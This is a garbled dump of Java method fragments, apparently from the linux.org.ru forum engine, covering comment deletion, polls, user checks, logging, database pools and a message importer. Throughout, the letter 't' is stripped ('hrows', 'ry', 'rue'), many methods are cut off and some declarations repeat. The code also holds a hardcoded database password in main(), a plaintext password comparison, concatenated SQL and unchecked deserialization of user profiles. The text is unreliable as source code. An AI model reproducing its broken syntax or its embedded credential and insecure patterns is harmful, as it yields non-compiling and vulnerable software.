public String getContent ( Object Config , ProfileHashtable profile ) hrows Exception { config = Config ; return getContentImpl ( profile ) ; } 
public String getVariantID ( ProfileHashtable profile , Properties request ) hrows UtilException { return "ProfileName="+profile.getStringProperty("ProfileName"); return ""; } 
String getVariantID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException , UtilException { return factory . getVariantID ( name , profile , request ) ; } 
long getVersionID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException { return factory . getVersionID ( name , profile , request ) ; } 
public abstract String getContent ( String name , ProfileHashtable profile ) hrows IOException , BoxletException , UtilException ; public abstract String getMenuContent ( String name , ProfileHashtable profile , String addUrl , String removeUrl ) hrows IOException , BoxletException , UtilException ; abstract String getVariantID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException , UtilException ; abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException ; } 
public abstract String getMenuContent ( String name , ProfileHashtable profile , String addUrl , String removeUrl ) hrows IOException , BoxletException , UtilException ; abstract String getVariantID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException , UtilException ; abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException ; } 
abstract String getVariantID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException , UtilException ; abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException ; } 
abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException ; } 
private Boxlet loadBox ( String name ) hrows BoxletException { ry { Class BoxletFactory = Class . forName ( " ru.org.linux.site.boxes. " + name ) ; 
public String getContent ( String name , ProfileHashtable profile ) hrows BoxletException , IOException { Boxlet bx = loadBox ( name ) ; StringBuffer buf = new StringBuffer ( ) ; ry { buf . append ( bx . getContent ( config , profile ) ) ; } catch ( Exception e ) { hrow new BoxletLoadException ( e ) ; } return buf . oString ( ) ; } 
String getVariantID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException , UtilException { Boxlet bx = loadBox ( name ) ; return bx . getVariantID ( profile , request ) ; } 
long getVersionID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException { Boxlet bx = loadBox ( name ) ; return bx . getVersionID ( profile , request ) ; } 
public synchronized void putObject ( String key , Object obj , long version ) { cache . put ( key , new CacheObject ( obj , version ) ) ; } 
public synchronized void putObject ( String key , CacheObject cobj ) { cache . put ( key , cobj ) ; } 
public synchronized void clear ( ) { cache . clear ( ) ; } 
public void debug ( String app , String message ) { log ( app , DEBUG , message ) ; } 
public void info ( String app , String message ) { log ( app , INFO , message ) ; } 
public void notice ( String app , String message ) { log ( app , NOTICE , message ) ; } 
public void error ( String app , String message ) { log ( app , ERROR , message ) ; } 
public void log ( String app , int level , String message ) { if ( ! closed ) { context . log ( app + " [ " + getLevelName ( level ) + " ] " + message ) ; 
public synchronized void log ( String app , int level , String message ) { Date date = new Date ( ) ; if ( logfile = = null ) { return ; } ry { logfile . write ( date + " " + app + " [ " + getLevelName ( level ) + " ] " + message + '' ) ; 
public synchronized void close ( ) { if ( logfile = = null ) { return ; } info ( " logger " , " closed logger " ) ; ry { logfile . close ( ) ; } catch ( IOException e ) { } logfile = null ; } 
public String getBanner ( ) hrows SQLException { Connection db = config . getConnection ( " banner rotator " ) ; Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT id, banner FROM banners WHERE today>0 AND total>0 ORDER BY total DESC LIMIT 1 " ) ; if ( ! rs . next ( ) ) { return " " ; } String banner = rs . getString ( " banner " ) ; int id = rs . getInt ( " id " ) ; rs . close ( ) ; st . executeUpdate ( " UPDATE banners SET total=total-1,today=today-1 WHERE id= " + id ) ; return ( " <a href= \" /forward.jsp?id= " + id + " \" ><img src= \" " + banner + " \" width= " + width + " height= " + height + " alt=adv border=0></a> " ) ; } 
public boolean isAnonymous ( ) { return " anonymous " . equals ( nick ) | | userScore < User . ANONYMOUS_LEVEL_SCORE ; } 
public String deleteComment ( int msgid , String reason , User user , int scoreBonus ) hrows SQLException { st1 . clearParameters ( ) ; st2 . clearParameters ( ) ; st1 . setInt ( 1 , msgid ) ; st2 . setInt ( 1 , msgid ) ; st2 . setInt ( 2 , user . getId ( ) ) ; st2 . setString ( 3 , reason ) ; st4 . setInt ( 1 , scoreBonus ) ; st4 . setInt ( 2 , msgid ) ; st1 . executeUpdate ( ) ; st2 . executeUpdate ( ) ; st4 . executeUpdate ( ) ; logger . notice ( " delete " , " " + msgid + " " + user . getNick ( ) + " ` " + reason + '\'' ) ; return " " + msgid + " " ; } 
public String deleteReplys ( int msgid , User user , boolean score ) hrows SQLException { return deleteReplys ( msgid , user , score , 0 ) ; } 
public String deleteReplys ( int msgid , User user , boolean score , int depth ) hrows SQLException { List replys = new ArrayList ( ) ; StringBuffer out = new StringBuffer ( ) ; st3 . setInt ( 1 , msgid ) ; ResultSet rs = st3 . executeQuery ( ) ; while ( rs . next ( ) ) { int r = rs . getInt ( " id " ) ; replys . add ( new Integer ( r ) ) ; } rs . close ( ) ; for ( Iterator i = replys . iterator ( ) ; i . hasNext ( ) ; ) { int r = ( ( Integer ) i . next ( ) ) . intValue ( ) ; out . append ( deleteReplys ( r , user , score , depth + + ) ) ; out . append ( " " + r + " <br> " ) ; switch ( depth ) { case 0 : if ( score ) { deleteComment ( r , " 7.1 (, 0) " , user , - 2 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; case 1 : if ( score ) { deleteComment ( r , " 7.1 (, 1) " , user , - 1 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; default : deleteComment ( r , " 7.1 (, >1) " , user , 0 ) ; break ; } } return out . oString ( ) ; } 
public void close ( ) hrows SQLException { st1 . close ( ) ; st2 . close ( ) ; st3 . close ( ) ; } 
public void addChild ( CommentNode child ) { childs . add ( child ) ; } 
public void hideAnonymous ( ) { if ( comment ! = null ) { if ( comment . isAnonymous ( ) ) hideNode ( ) ; } if ( comment = = null | | comment . isShowable ( ) ) { for ( Iterator i = childs . iterator ( ) ; i . hasNext ( ) ; ) { 
public void buildList ( List list ) { if ( comment ! = null ) list . add ( comment ) ; for ( Iterator i = childs . iterator ( ) ; i . hasNext ( ) ; ) { CommentNode node = ( CommentNode ) i . next ( ) ; 
public void hideNode ( ) { if ( comment ! = null ) comment . setShow ( false ) ; for ( Iterator i = childs . iterator ( ) ; i . hasNext ( ) ; ) { CommentNode node = ( CommentNode ) i . next ( ) ; 
private void showCommentList ( StringBuffer buf , List comments , boolean reverse ) hrows IOException , SQLException , UtilException { if ( reverse ) { Collections . reverse ( comments ) ; } for ( Iterator i = comments . iterator ( ) ; i . hasNext ( ) ; ) { Comment comment = ( Comment ) i . next ( ) ; 
public String showAll ( ) hrows IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; List comments = new ArrayList ( COMMENTS_INITIAL_BUFSIZE ) ; while ( rs . next ( ) ) { comments . add ( new Comment ( rs ) ) ; } showCommentList ( buf , comments , false ) ; return buf . oString ( ) ; } 
public synchronized Connection getConnection ( String user ) hrows SQLException { if ( db = = null ) { long startMillis = new Date ( ) . getTime ( ) ; db = pool . getConnection ( config , user ) ; logger.notice("config", "opened connection for '"+user+"'"); long endMillis = new Date().getTime(); dbWaitTime = endMillis - startMillis; } return db; } 
public synchronized Connection getConnectionWhois ( ) hrows SQLException { if ( db = = null ) { long startMillis = new Date ( ) . getTime ( ) ; db = pool . getConnectionWhois ( config ) ; long endMillis = new Date ( ) . getTime ( ) ; dbWaitTime = endMillis - startMillis ; } return db ; } 
public synchronized void SQLclose ( ) hrows SQLException { if ( db ! = null ) { db . close ( ) ; } db = null ; } 
protected synchronized void initDataSource ( Properties config ) { if ( dataSource ! = null ) return ; dataSource = new MyDataSource ( ) ; dataSource . setDataSourceName ( " Main pool " ) ; dataSource . setServerName ( " localhost " ) ; dataSource . setDatabaseName ( " linux " ) ; dataSource . setUser ( config . getProperty ( " JDBC_USER " ) ) ; dataSource . setPassword ( config . getProperty ( " JDBC_PASS " ) ) ; dataSource . setMaxConnections ( 10 ) ; dataSource . setInitialConnections ( 10 ) ; } 
protected synchronized void initDataSourceWhois ( Properties config ) { if ( dataSourceWhois ! = null ) return ; dataSourceWhois = new MyDataSource ( ) ; dataSourceWhois . setDataSourceName ( " Whois pool " ) ; dataSourceWhois . setServerName ( " localhost " ) ; dataSourceWhois . setDatabaseName ( " linux " ) ; dataSourceWhois . setUser ( config . getProperty ( " JDBC_USER " ) ) ; dataSourceWhois . setPassword ( config . getProperty ( " JDBC_PASS " ) ) ; dataSourceWhois . setMaxConnections ( 4 ) ; dataSourceWhois . setInitialConnections ( 4 ) ; } 
public Connection getConnection ( Properties config , String user ) hrows SQLException { initDataSource ( config ) ; Connection db ; boolean usePool = " TRUE " . equals ( config . getProperty ( " DB_POOL " ) ) ; if ( usePool ) db = dataSource . getConnection ( ) ; else db = DriverManager . getConnection ( config . getProperty ( " JDBC_URL " ) , config . getProperty ( " JDBC_USER " ) , config . getProperty ( " JDBC_PASS " ) ) ; return db ; } 
public Connection getConnectionWhois ( Properties config ) hrows SQLException { initDataSourceWhois ( config ) ; Connection db ; boolean usePool = " TRUE " . equals ( config . getProperty ( " DB_POOL " ) ) ; if ( usePool ) db = dataSourceWhois . getConnection ( ) ; else db = DriverManager . getConnection ( config . getProperty ( " JDBC_URL " ) , config . getProperty ( " JDBC_USER " ) , config . getProperty ( " JDBC_PASS " ) ) ; return db ; } 
protected PGConnectionPoolDataSource createConnectionPool ( ) { PGConnectionPoolDataSource pool = new PGConnectionPoolDataSource ( ) ; pool . setDefaultAutoCommit ( rue ) ; return pool ; } 
public static DeleteInfo getDeleteInfo ( Connection db , int msgid ) hrows SQLException { PreparedStatement pst = null ; ry { pst = db . prepareStatement ( " SELECT nick,reason,users.id as userid FROM del_info,users WHERE msgid=? AND users.id=del_info.delby " ) ; 
public synchronized boolean check ( String ip ) { cleanup ( ) ; if ( hash . containsKey ( ip ) ) return false ; hash . put ( ip , new Date ( ) ) ; return rue ; } 
public synchronized void cleanup ( ) { Date current = new Date ( ) ; for ( Iterator i = hash . entrySet ( ) . iterator ( ) ; i . hasNext ( ) ; ) { Map . Entry entry = ( Map . Entry ) i . next ( ) ; 
public boolean isPreformatAllowed ( ) { return preformat ; } 
public boolean isImagePostAllowed ( ) { return imagepost ; } 
public boolean isLinksAllowed ( ) { return havelink ; } 
public boolean isTopicsRestricted ( ) { return restrictTopics ! = 0 ; } 
public static IPBlockInfo getBlockInfo ( Connection db , String addr ) hrows SQLException { PreparedStatement st = null ; ry { st = db . prepareStatement ( " SELECT reason, ban_date, date, mod_id FROM b_ips WHERE ip = ?::inet " ) ; 
public boolean isBlocked ( ) { return banDate = = null | | banDate . after ( new Date ( ) ) ; } 
public void checkBlock ( ) hrows AccessViolationException { if ( isBlocked ( ) ) { hrow new AccessViolationException ( " : " + reason ) ; 
public static void checkBlockIP ( Connection db , String addr ) hrows AccessViolationException , SQLException { IPBlockInfo block = getBlockInfo ( db , addr ) ; if ( block = = null ) { return ; } block . checkBlock ( ) ; } 
protected void doGet ( HttpServletRequest httpServletRequest , HttpServletResponse httpServletResponse ) hrows ServletException , IOException { byte [ ] captchaChallengeAsJpeg = null ; the output stream to render the captcha image as jpeg into ByteArrayOutputStream jpegOutputStream = new ByteArrayOutputStream(); try { get the session id that will identify the generated captcha. the same id must be used to validate the response, the session id is a good candidate! String captchaId = httpServletRequest.getSession().getId(); call the ImageCaptchaService getChallenge method BufferedImage challenge = CaptchaSingleton.getInstance().getImageChallengeForID(captchaId, httpServletRequest.getLocale()); a jpeg encoder JPEGImageEncoder jpegEncoder = JPEGCodec.createJPEGEncoder(jpegOutputStream); jpegEncoder.encode(challenge); } catch (IllegalArgumentException e) { httpServletResponse.sendError(HttpServletResponse.SC_NOT_FOUND); return; } catch (CaptchaServiceException e) { httpServletResponse.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR); return; } captchaChallengeAsJpeg = jpegOutputStream.toByteArray(); flush it in the response httpServletResponse.setHeader("Cache-Control", "no-store"); httpServletResponse.setHeader("Pragma", "no-cache"); httpServletResponse.setDateHeader("Expires", 0); httpServletResponse.setContentType("image/jpeg"); ServletOutputStream responseOutputStream = httpServletResponse.getOutputStream(); responseOutputStream.write(captchaChallengeAsJpeg); responseOutputStream.flush(); responseOutputStream.close(); } 
public boolean isCommentEnabled ( ) { return comment ; } 
public int getNextMessage ( Connection db , int scrollMode ) hrows SQLException { final PreparedStatement pst ; switch ( scrollMode ) { case SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT min(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case SCROLL_NOSCROLL : default : return 0 ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public int getPreviousMessage ( Connection db , int scrollMode ) hrows SQLException { final PreparedStatement pst ; switch ( scrollMode ) { case SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT max(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case SCROLL_NOSCROLL : default : return 0 ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public void updateMessageText ( Connection db , String ext ) hrows SQLException { final PreparedStatement pst ; pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; pst . setString ( 1 , ext ) ; pst . setInt ( 2 , msgid ) ; pst . executeUpdate ( ) ; } 
public String showAll ( ) hrows IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( ) ) ; } return buf . oString ( ) ; } 
public static int getCurrentPollId ( Connection db ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " select id from votenames where commitdate = (select max(commitdate) from votenames where moderate AND NOT deleted) " ) ; rs . next ( ) ; return rs . getInt ( " id " ) ; } 
public static Poll getCurrentPoll ( Connection db ) hrows SQLException { ry { return new Poll ( db , getCurrentPollId ( db ) ) ; 
private static int getNextPollId ( Connection db ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " select nextval('vote_id') as voteid " ) ; rs . next ( ) ; return rs . getInt ( " voteid " ) ; } 
public static int createPoll ( Connection db , User user , String itle , List pollList ) hrows SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id, title, topic, groupid, userid, postdate) values (?,?,nextval('s_msgid'), nextval('s_guid'), ?, CURRENT_TIMESTAMP) " ) ; pst . setInt ( 1 , voteid ) ; pst . setString ( 2 , itle ) ; pst . setInt ( 3 , user . getId ( ) ) ; pst . executeUpdate ( ) ; ry { Poll poll = new Poll ( db , voteid ) ; for ( Iterator i = pollList . iterator ( ) ; i . hasNext ( ) ; ) { String variant = ( String ) i . next ( ) ; if ( variant . rim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } } catch ( PollNotFoundException ex ) { hrow new RuntimeException ( ex ) ; } return voteid ; } 
public void commit ( Connection db , User commitby ) hrows SQLException { PreparedStatement pst = db . prepareStatement ( " UPDATE votenames SET moderate='t', commitby=?, commitdate='now' WHERE id=? " ) ; pst . setInt ( 1 , commitby . getId ( ) ) ; pst . setInt ( 2 , id ) ; PreparedStatement pst2 = db . prepareStatement ( " UPDATE users SET score=score+3 WHERE id IN (SELECT userid FROM votenames WHERE id=?) AND score<300 " ) ; pst2 . setInt ( 1 , id ) ; pst . executeUpdate ( ) ; pst2 . executeUpdate ( ) ; pst . close ( ) ; pst2 . close ( ) ; } 
public List getPollVariants ( Connection db , int order ) hrows SQLException { List variants = new ArrayList ( ) ; Statement st = db . createStatement ( ) ; ResultSet rs ; switch ( order ) { case ORDER_ID : rs = st . executeQuery ( " SELECT * FROM votes WHERE vote= " + id + " ORDER BY id " ) ; break ; case ORDER_VOTES : rs = st . executeQuery ( " SELECT * FROM votes WHERE vote= " + id + " ORDER BY votes DESC, id " ) ; break ; default : hrow new RuntimeException ( " Oops!? order= " + order ) ; } while ( rs . next ( ) ) { int varId = rs . getInt ( " id " ) ; String label = rs . getString ( " label " ) ; int votes = rs . getInt ( " votes " ) ; variants . add ( new PollVariant ( varId , label , votes ) ) ; } return variants ; } 
public int getMaxVote ( Connection db ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT max(votes) FROM votes WHERE vote= " + id ) ; rs . next ( ) ; int max = rs . getInt ( " max " ) ; if ( max = = 0 ) { max = 1 ; } rs . close ( ) ; st . close ( ) ; return max ; } 
public void addNewVariant ( Connection db , String label ) hrows SQLException { PreparedStatement addPst = db . prepareStatement ( " INSERT INTO votes (id, vote, label) values (nextval('votes_id'), ?, ?) " ) ; addPst . clearParameters ( ) ; addPst . setInt ( 1 , id ) ; addPst . setString ( 2 , label ) ; addPst . executeUpdate ( ) ; } 
public void updateLabel ( Connection db , String label ) hrows SQLException { if ( his . label . equals ( label ) ) { return ; } PreparedStatement pst = db . prepareStatement ( " UPDATE votes SET label=? WHERE id=? " ) ; pst . setString ( 1 , label ) ; pst . setInt ( 2 , id ) ; pst . executeUpdate ( ) ; his . label = label ; } 
public void remove ( Connection db ) hrows SQLException { Statement st = db . createStatement ( ) ; st . executeUpdate ( " DELETE FROM votes WHERE id= " + id ) ; } 
private static synchronized void initServletLogger ( ServletContext context ) { if ( logger = = null ) { logger = new ServletLogger ( context ) ; 
private static synchronized void initProperties ( String configFileName ) hrows IOException { File propFile = new File ( configFileName ) ; if ( properties = = null ) { Properties mp = new Properties ( ) ; 
public Connection getConnection ( String user ) hrows SQLException { return config . getConnection ( user ) ; } 
public Connection getConnectionWhois ( ) hrows SQLException { return config . getConnectionWhois ( ) ; } 
public String replaceProfile ( HttpServletRequest request , String profile ) { String path = request . getRequestURI ( ) ; REMatch found = profileRE . getMatch ( path ) ; if ( found ! = null ) { String begin = path . substring ( 0 , found . getSubStartIndex ( 1 ) ) ; 
private Map readProfile ( String name ) hrows ClassNotFoundException , IOException , StorageException { InputStream df = config . getStorage ( ) . getReadStream ( " profile " , name ) ; ObjectInputStream dof = new ObjectInputStream ( df ) ; Map profile = ( Map ) dof . readObject ( ) ; dof . close ( ) ; df . close ( ) ; return profile ; } 
public void writeProfile ( String name ) hrows IOException , AccessViolationException , StorageException { if ( name . charAt ( 0 ) = = '_' ) { hrow new AccessViolationException ( " " ) ; } if ( ! StringUtil . checkLoginName ( name ) ) { hrow new AccessViolationException ( " " ) ; } if ( " anonymous " . equals ( name ) ) { hrow new AccessViolationException ( " " ) ; } userProfile . put ( " system.timestamp " , new Long ( new Date ( ) . getTime ( ) ) ) ; userProfile . remove ( " Storage " ) ; OutputStream df = config . getStorage ( ) . getWriteStream ( " profile " , name ) ; ObjectOutputStream dof = new ObjectOutputStream ( df ) ; dof . writeObject ( userProfile ) ; dof . close ( ) ; df . close ( ) ; userProfile . put ( " Storage " , config . getStorage ( ) ) ; } 
public boolean isSearchMode ( ) { return searchMode ; } 
public boolean isDebugMode ( ) { return debugMode ; } 
public String head ( ) { return " <!DOCTYPE HTML PUBLIC \" -W3CDTD HTML 4.0 TransitionalEN \" \" http:www.w3.org/TR/REC-html40/loose.dtd \" > n<html lang=ru> n<head> " ; } 
public String DocumentHeader ( ) hrows IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <link rel= \" search \" title= \" Search L.O.R. \" href= \" search.php \" > " ) ; out . append ( " <link rel= \" op \" title= \" Linux.org.ru \" href= \" index.jsp \" > " ) ; out.append("<a href=\"http:www.centerpress.ru/shop/computer_press/linuxformat/lxf-2007/ref_102196\"><img src=\"http:www.linux.org.ru/adv/linuxformat/lxf2007.gif\"></a>"); banners out.append("</div>"); out.append(FileUtils.readfile(config.getHTMLPathPrefix() + style + "/head-main2.html")); } else { out.append(FileUtils.readfile(config.getHTMLPathPrefix() + style + "/head.html")); } } else { if (isMainPage()) { out.append(FileUtils.readfile(config.getHTMLPathPrefix() + style + "/head-main.html")); } else { out.append(FileUtils.readfile(config.getHTMLPathPrefix() + style + "/head.html")); } } if (!isSearchMode()) { hidden counters if (isMainPage()) { out.append(config.getStorage().readMessage("buttons", "top100-main-hidden")); out.append(config.getStorage().readMessage("buttons", "toplist-main-hidden")); } else { out.append(config.getStorage().readMessage("buttons", "toplist-hidden")); } } return out.toString(); } 
public String DocumentFooter ( boolean closeHtml ) hrows IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">_uacct = \"UA-1826606-1\";urchinTracker(); </script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String DocumentFooter ( ) hrows IOException , StorageException { return DocumentFooter ( rue ) ; } 
public boolean isUsingDefaultProfile ( ) { return usingDefaultProfile ; } 
public static boolean isSessionAuthorized ( HttpSession session ) { return session ! = null & & session . getAttribute ( " login " ) ! = null & & ( ( Boolean ) session . getAttribute ( " login " ) ) . booleanValue ( ) ; } 
public boolean isModeratorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return ( ( Boolean ) session . getValue ( " moderator " ) ) . booleanValue ( ) ; } 
public boolean isAnonymousProfile ( ) { if ( isUsingDefaultProfile ( ) ) { return rue ; } return profileName . startsWith ( " _ " ) ; } 
public void checkPassword ( String password ) hrows BadPasswordException { if ( blocked ) { hrow new BadPasswordException ( nick ) ; } if ( ! password . equals ( his . password ) ) { hrow new BadPasswordException ( nick ) ; 
public void checkAnonymous ( ) hrows AccessViolationException { if ( anonymous | | blocked ) { hrow new AccessViolationException ( " Anonymous user " ) ; 
public void checkBlocked ( ) hrows AccessViolationException { if ( blocked ) { hrow new AccessViolationException ( " Blocked user " ) ; } if ( ! activated ) { hrow new AccessViolationException ( " Not activated user " ) ; 
public void checkCommit ( ) hrows AccessViolationException { if ( anonymous | | blocked ) { hrow new AccessViolationException ( " Commit access denied for anonymous user " ) ; } if ( ! canmod ) { hrow new AccessViolationException ( " Commit access denied for user " + nick + " ( " + id + " ) " ) ; 
public void checkDelete ( ) hrows AccessViolationException { if ( anonymous | | blocked ) { hrow new AccessViolationException ( " Delete access denied for anonymous user " ) ; } if ( ! candel ) { hrow new AccessViolationException ( " Delete access denied for user " + nick + " ( " + id + " ) " ) ; 
public boolean isAnonymous ( ) { return anonymous ; } 
public static void updateUserLastlogin ( Connection dbconn , String nick , Date lTime ) hrows SQLException { update lastlogin time in database String sSql = "UPDATE users SET lastlogin=? WHERE nick=?"; PreparedStatement pst = dbconn.prepareStatement(sSql); pst.setTimestamp(1, new Timestamp(lTime.getTime())); pst.setString(2, nick); pst.executeUpdate(); pst.close(); getLogger().notice("template" , "User "+nick+" logged in."); 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } if ( canModerate ( ) ) { return false ; } return maxScore < 100 ; } 
public static User getCurrentUser ( Connection db , HttpSession session ) hrows SQLException , UserNotFoundException { if ( ! Template . isSessionAuthorized ( session ) ) { return null ; } return new User ( db , ( String ) session . getAttribute ( " nick " ) ) ; } 
public boolean isActivated ( ) { return activated ; } 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException , SQLException , BadDateException { Connection db = null ; ry { db = ( ( SQLConfig ) config ) . getConnection ( " archive " ) ; 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException , SQLException , StorageException , UtilException { Connection db = null ; ry { db = ( ( SQLConfig ) config ) . getConnection ( " fullnews " ) ; 
public String getVariantID ( ProfileHashtable prof , Properties request ) hrows UtilException { return " SearchMode= " + prof . getBooleanProperty ( " SearchMode " ) + " &topics= " + prof . getIntProperty ( " opics " ) + " &style= " + prof . getStringProperty ( " style " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException , SQLException { Connection db = null ; ry { db = ( ( SQLConfig ) config ) . getConnection ( " gallery " ) ; 
public String getVariantID ( ProfileHashtable prof , Properties request ) hrows UtilException { return " SearchMode= " + prof . getBooleanProperty ( " SearchMode " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <h2><a href= \" http:justnews.ru/ \" >JustNews</a></h2> " ) ; out . append ( FileUtils . readfile ( ( ( PropertiesConfig ) config ) . getProperties ( ) . getProperty ( " PathPrefix " ) + " linux-fetch/headline-justnews.html " ) ) ; return out . oString ( ) ; } 
public String getContentImpl ( ProfileHashtable profile ) hrows SQLException , UtilException { Connection db = null ; ry { db = ( ( SQLConfig ) config ) . getConnection ( " poll " ) ; 
public String getVariantID ( ProfileHashtable prof , Properties request ) hrows UtilException { return " SearchMode= " + prof . getBooleanProperty ( " SearchMode " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <h2> </h2> " ) ; if ( profile . getStringProperty ( " ProfileName " ) = = null ) out . append ( " -<p> " ) ; else out . append ( " : <em> " + profile . getStringProperty ( " ProfileName " ) + " </em><p> " ) ; out . append ( " <br><a href= \" edit-profile.jsp \" >...</a> " ) ; out . append ( " <p><strong>:</strong><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile= \" > </a><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile=_white \" > white</a><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile=_white2 \" > white2</a><br> " ) ; return out . oString ( ) ; } 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException { return ( " <h2></h2> <h3> </h3> * <a href= \" /gnome \" >gnome</a><br> * <a href= \" /rc5 \" >rc5</a><br> " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException , SQLException , UtilException { Connection db = null ; ry { db = ( ( SQLConfig ) config ) . getConnection ( " op10 " ) ; 
public String getVariantID ( ProfileHashtable prof , Properties request ) hrows UtilException { return " SearchMode= " + prof . getBooleanProperty ( " SearchMode " ) + " &messages= " + prof . getIntProperty ( " messages " ) + " &style= " + prof . getStringProperty ( " style " ) ; } 
public static void main ( String [ ] args ) hrows Exception { logger . info ( " Connecting to DB: " + database ) ; Class . forName ( " org.postgresql.Driver " ) ; Connection db = DriverManager . getConnection ( database , " linuxweb " , " obsidian0 " ) ; PreparedStatement st = db . prepareStatement ( " INSERT INTO msgbase VALUES(?,?) " ) ; File dir = new File ( " /var/www/linux.org.ru/lor-storage/linux-storage/msgbase " ) ; logger . info ( " Reading directory " ) ; String [ ] files = dir . list ( ) ; logger . info ( " Got " + files . length + " files! " ) ; char [ ] buffer = new char [ BUFFER_SIZE ] ; for ( int i = 0 ; i < files . length ; i + + ) { if ( i % 10000 = = 0 ) { logger . info ( " Current msgid = " + files [ i ] + " (i= " + i + ')' ) ; } int msgid = Integer . parseInt ( files [ i ] ) ; if ( msgid > 1279505 ) { continue ; } FileReader reader = new FileReader ( dir . getPath ( ) + '/' + files [ i ] ) ; StringBuffer str = new StringBuffer ( ) ; while ( rue ) { int size = reader . read ( buffer ) ; if ( size = = - 1 ) { break ; } str . append ( buffer , 0 , size ) ; } st . setInt ( 1 , msgid ) ; st . setString ( 2 , str . oString ( ) ) ; st . execute ( ) ; st . clearParameters ( ) ; } logger . info ( " Closing connection " ) ; db . close ( ) ; } 
